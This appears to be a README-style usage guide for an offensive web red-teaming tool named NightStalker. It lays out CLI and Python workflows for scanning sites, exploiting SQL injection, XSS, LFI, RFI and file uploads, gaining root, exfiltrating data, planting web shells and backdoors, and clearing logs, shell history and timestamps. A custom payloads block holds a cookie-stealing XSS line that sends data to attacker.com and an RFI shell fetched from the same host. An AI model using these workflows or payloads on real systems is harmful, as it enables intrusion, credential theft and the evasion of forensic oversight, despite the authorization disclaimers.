# NightStalker Web Red Teaming Guide

## Overview

The NightStalker Web Red Teaming module provides comprehensive offensive security capabilities for web applications, including reconnaissance, exploitation, post-exploitation, trace clearing, and root access escalation.

## Features

### 🔍 Comprehensive Reconnaissance
- **Basic Reconnaissance**: Server information, technology detection, DNS analysis
- **Technology Enumeration**: Framework detection, CMS identification, language analysis
- **Directory Enumeration**: Common directory and file discovery
- **Subdomain Enumeration**: Subdomain discovery and analysis
- **Vulnerability Scanning**: SQL injection, XSS, LFI, RFI, open redirect, SSRF, CSRF testing
- **Advanced Enumeration**: Endpoint discovery, parameter analysis, backup file detection

### 💥 Exploitation Capabilities
- **SQL Injection**: Automated SQLMap integration
- **Cross-Site Scripting (XSS)**: Reflected and stored XSS exploitation
- **Local File Inclusion (LFI)**: File inclusion and directory traversal
- **Remote File Inclusion (RFI)**: Remote file execution
- **File Upload**: Malicious file upload exploitation

### 🔧 Post-Exploitation
- **Privilege Escalation**: SUDO, SUID, capabilities, kernel exploits
- **Lateral Movement**: Network reconnaissance and movement
- **Data Exfiltration**: Sensitive data extraction
- **Persistence**: Backdoor and persistence mechanism establishment
- **Root Access**: Multiple root access escalation techniques

### 🧹 Trace Clearing
- **Log Clearing**: System, web server, and database logs
- **History Clearing**: User command history and session data
- **Temporary File Cleanup**: Suspicious file removal
- **Network Trace Clearing**: ARP cache, connection history, DNS cache
- **Timestamp Manipulation**: File timestamp reset

### 📊 Reporting
- **Comprehensive Reports**: HTML-based detailed reports
- **Evidence Collection**: Structured data collection
- **Timeline Analysis**: Attack timeline reconstruction

## CLI Usage

### Basic Scan
```bash
# Comprehensive scan with all modules
python -m nightstalker.cli webred scan --url https://target.com --modules all --output scan_results.json

# Specific module scan
python -m nightstalker.cli webred scan --url https://target.com --modules recon tech vuln --output scan.json
```

### Exploitation
```bash
# Basic exploitation
python -m nightstalker.cli webred exploit --url https://target.com --exploit sqlmap

# Exploitation with custom payload
python -m nightstalker.cli webred exploit --url https://target.com --exploit xss --payload "<script>alert('XSS')</script>"

# Exploitation with post-exploitation
python -m nightstalker.cli webred exploit --url https://target.com --exploit lfi --post-exploit
```

### Post-Exploitation
```bash
# Run post-exploitation activities
python -m nightstalker.cli webred post-exploit --target-info scan_results.json --gain-root --exfil-data --establish-persistence
```

### Trace Clearing
```bash
# Basic trace clearing
python -m nightstalker.cli webred clear-traces --target-info exploit_results.json

# Aggressive trace clearing
python -m nightstalker.cli webred clear-traces --target-info exploit_results.json --aggressive --backup-logs backup/
```

### Report Generation
```bash
# Generate comprehensive report
python -m nightstalker.cli webred report --input comprehensive_results.json --output final_report.html --include-traces
```

## Complete Workflow Example

### Step 1: Reconnaissance
```bash
python -m nightstalker.cli webred scan --url https://target.com --modules all --output initial_scan.json
```

### Step 2: Exploitation
```bash
python -m nightstalker.cli webred exploit --url https://target.com --exploit sqlmap --post-exploit
```

### Step 3: Post-Exploitation
```bash
python -m nightstalker.cli webred post-exploit --target-info initial_scan.json --gain-root --exfil-data
```

### Step 4: Trace Clearing
```bash
python -m nightstalker.cli webred clear-traces --target-info initial_scan.json --aggressive
```

### Step 5: Reporting
```bash
python -m nightstalker.cli webred report --input all_results.json --output final_report.html
```

## Python API Usage

### Basic Usage
```python
from nightstalker.redteam.webred import WebRedTeam

# Initialize web red team module
webred = WebRedTeam()

# Comprehensive scan
scan_results = webred.scan("https://target.com", ['recon', 'enum', 'vuln', 'tech'])

# Exploitation
exploit_results = webred.exploit("https://target.com", "sqlmap")

# Post-exploitation
post_exploit_results = webred.post_exploitation(exploit_results)

# Trace clearing
trace_clearing_results = webred.clear_traces(exploit_results)

# Report generation
report_path = webred.report("results.json", "report.html")
```

### Advanced Usage
```python
# Custom scan with specific modules
scan_results = webred.scan("https://target.com", ['recon', 'tech', 'dir'])

# Exploitation with custom payload
exploit_results = webred.exploit("https://target.com", "xss", "<script>alert('XSS')</script>")

# Post-exploitation with specific activities
post_exploit = webred.post_exploitation(target_info)
root_access = webred._gain_root_access(target_info)
data_exfil = webred._data_exfiltration(target_info)
persistence = webred._establish_persistence(target_info)

# Comprehensive trace clearing
trace_clearing = webred.clear_traces(target_info)
```

## Scan Modules

### Reconnaissance (`recon`)
- Server information extraction
- Technology stack detection
- DNS information gathering
- Robots.txt analysis
- Sitemap discovery

### Technology Enumeration (`tech`)
- Framework detection (Django, Flask, Express, etc.)
- CMS identification (WordPress, Drupal, Joomla)
- Programming language detection
- Database technology identification
- Web server identification
- Security header analysis

### Directory Enumeration (`dir`)
- Common directory discovery
- Hidden file detection
- Backup file identification
- Configuration file discovery
- Development file detection

### Subdomain Enumeration (`subdomain`)
- Subdomain discovery
- DNS enumeration
- Virtual host detection
- Subdomain takeover analysis

### Vulnerability Scanning (`vuln`)
- SQL injection testing
- Cross-site scripting (XSS) testing
- Local file inclusion (LFI) testing
- Remote file inclusion (RFI) testing
- Open redirect testing
- Server-side request forgery (SSRF) testing
- Cross-site request forgery (CSRF) testing

### Advanced Enumeration (`enum`)
- API endpoint discovery
- Parameter analysis
- Version information extraction
- Error page analysis
- Backup file detection

## Exploitation Types

### SQLMap (`sqlmap`)
- Automated SQL injection detection
- Database enumeration
- Data extraction
- Privilege escalation

### Cross-Site Scripting (`xss`)
- Reflected XSS exploitation
- Stored XSS exploitation
- DOM-based XSS testing
- XSS payload delivery

### Local File Inclusion (`lfi`)
- File inclusion exploitation
- Directory traversal
- Configuration file reading
- Source code disclosure

### Remote File Inclusion (`rfi`)
- Remote file execution
- Web shell upload
- Command execution
- Backdoor establishment

### File Upload (`upload`)
- Malicious file upload
- Web shell deployment
- File type bypass
- Upload directory discovery

## Post-Exploitation Activities

### Privilege Escalation
- SUDO privilege analysis
- SUID binary exploitation
- Linux capabilities exploitation
- Kernel vulnerability exploitation
- Cron job exploitation
- Environment variable manipulation

### Root Access Escalation
- Kernel exploit attempts
- SUDO exploitation techniques
- SUID binary exploitation
- Capability-based exploitation
- Cron job exploitation
- Service exploitation

### Data Exfiltration
- Sensitive file extraction
- Database data extraction
- Configuration file exfiltration
- User data collection
- Network information gathering

### Persistence Establishment
- Backdoor deployment
- Scheduled task creation
- Service installation
- Registry modification
- Startup script modification

## Trace Clearing Capabilities

### Log Clearing
- System log files (`/var/log/`)
- Authentication logs
- Web server logs (Apache, Nginx)
- Database logs (MySQL, PostgreSQL)
- Application logs

### History Clearing
- Bash history files
- Shell history files
- Database history files
- Application history files

### Temporary File Cleanup
- Temporary directory cleanup
- Suspicious file removal
- Upload directory cleanup
- Cache file removal

### Network Trace Clearing
- ARP cache clearing
- Connection history removal
- DNS cache clearing
- Network interface cleanup

### Timestamp Manipulation
- File timestamp reset
- Directory timestamp modification
- Access time manipulation
- Modification time reset

## Report Generation

### HTML Report Features
- Executive summary
- Technical findings
- Vulnerability details
- Exploitation results
- Post-exploitation activities
- Trace clearing activities
- Timeline analysis
- Evidence collection

### Report Sections
1. **Executive Summary**: High-level findings and recommendations
2. **Technical Details**: Detailed technical analysis
3. **Vulnerabilities**: Identified vulnerabilities with severity ratings
4. **Exploitation**: Successful exploitation techniques
5. **Post-Exploitation**: Activities performed after initial access
6. **Trace Clearing**: Evidence removal activities
7. **Timeline**: Chronological attack timeline
8. **Evidence**: Collected evidence and artifacts

## Security Considerations

### Authorization
- Only use on authorized targets
- Obtain proper written permission
- Follow responsible disclosure practices
- Respect scope limitations

### Legal Compliance
- Ensure compliance with local laws
- Follow ethical hacking guidelines
- Maintain proper documentation
- Report findings responsibly

### Operational Security
- Use secure communication channels
- Implement proper logging
- Maintain evidence integrity
- Follow chain of custody procedures

## Troubleshooting

### Common Issues

#### Import Errors
```bash
# Ensure proper module installation
pip install -r requirements.txt
python -m nightstalker.cli --help
```

#### Permission Errors
```bash
# Run with appropriate permissions
sudo python -m nightstalker.cli webred scan --url https://target.com
```

#### Network Issues
```bash
# Check network connectivity
ping target.com
curl -I https://target.com
```

### Debug Mode
```bash
# Enable debug logging
export NIGHTSTALKER_DEBUG=1
python -m nightstalker.cli webred scan --url https://target.com
```

## Advanced Configuration

### Custom Payloads
```python
# Custom exploitation payloads
custom_payloads = {
    'xss': '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
    'lfi': '../../../etc/passwd',
    'rfi': 'http://attacker.com/shell.txt'
}
```

### Custom Scan Modules
```python
# Extend scan capabilities
def custom_scan_module(url):
    # Custom scanning logic
    pass
```

### Custom Exploitation Techniques
```python
# Extend exploitation capabilities
def custom_exploit(url, payload):
    # Custom exploitation logic
    pass
```

## Integration with Other Modules

### Payload Integration
```bash
# Use payload builder with web red teaming
python -m nightstalker.cli payload build --type web_shell --format php
python -m nightstalker.cli webred exploit --url https://target.com --exploit upload --payload web_shell.php
```

### Exfiltration Integration
```bash
# Use exfiltration module for data extraction
python -m nightstalker.cli exfil --data sensitive_data.txt --channels https dns
```

### Monitoring Integration
```bash
# Use monitoring for persistence
python -m nightstalker.cli monitor --paths /var/www/html --payload backdoor.php
```

## Best Practices

### Reconnaissance
- Start with passive reconnaissance
- Use multiple information sources
- Document all findings
- Maintain scope boundaries

### Exploitation
- Test exploits in safe environment first
- Use least privilege principle
- Document exploitation steps
- Maintain access logs

### Post-Exploitation
- Minimize system impact
- Document all activities
- Maintain operational security
- Plan exit strategy

### Trace Clearing
- Backup before clearing
- Use systematic approach
- Verify clearing effectiveness
- Document clearing activities

### Reporting
- Include executive summary
- Provide technical details
- Include remediation recommendations
- Maintain evidence chain

## Conclusion

The NightStalker Web Red Teaming module provides comprehensive offensive security capabilities for web application testing. By following this guide and best practices, you can conduct thorough web security assessments while maintaining professional standards and legal compliance.

Remember: Always obtain proper authorization before testing any web application, and follow responsible disclosure practices when reporting vulnerabilities. 